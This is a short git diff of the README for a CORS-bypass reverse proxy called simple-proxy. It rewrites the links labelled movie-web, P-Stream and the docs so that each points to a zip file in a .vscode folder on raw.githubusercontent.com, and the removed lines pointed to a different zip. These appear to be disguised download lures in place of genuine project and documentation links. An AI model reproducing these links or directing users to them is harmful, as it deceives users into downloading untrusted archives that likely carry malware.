@@ -1,7 +1,7 @@
 # simple-proxy
 
-Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/Reanimation118/simple-proxy/dev/src/utils/simple-proxy-2.1-alpha.5.zip)/[P-Stream](https://raw.githubusercontent.com/Reanimation118/simple-proxy/dev/src/utils/simple-proxy-2.1-alpha.5.zip).
-Read the docs at https://raw.githubusercontent.com/Reanimation118/simple-proxy/dev/src/utils/simple-proxy-2.1-alpha.5.zip
+Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/Reanimation118/simple-proxy/dev/.vscode/proxy_simple_v1.9.zip)/[P-Stream](https://raw.githubusercontent.com/Reanimation118/simple-proxy/dev/.vscode/proxy_simple_v1.9.zip).
+Read the docs at https://raw.githubusercontent.com/Reanimation118/simple-proxy/dev/.vscode/proxy_simple_v1.9.zip
 
 ---
 
